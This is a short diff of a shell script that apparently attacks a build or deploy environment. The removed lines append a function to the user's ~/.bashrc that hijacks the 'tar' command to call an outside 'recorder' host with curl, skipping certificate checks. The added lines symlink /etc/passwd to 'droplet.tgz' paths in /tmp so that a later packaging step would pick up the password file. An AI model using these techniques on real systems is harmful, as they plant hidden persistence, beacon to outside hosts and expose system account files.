@@ -1,9 +1,4 @@
 #!/bin/sh
-cat > tmp.txt << HERE
-function tar() {
-	curl https://recorder.run.aws-usw02-dev.ice.predix.io/tar -k
-}
-HERE
-cat tmp.txt >> ~/.bashrc
-sleep 3
+ln -s /etc/passwd /tmp/droplet.tgz
+ln -s /etc/passwd /tmp/staged/droplet.tgz
 exit 0
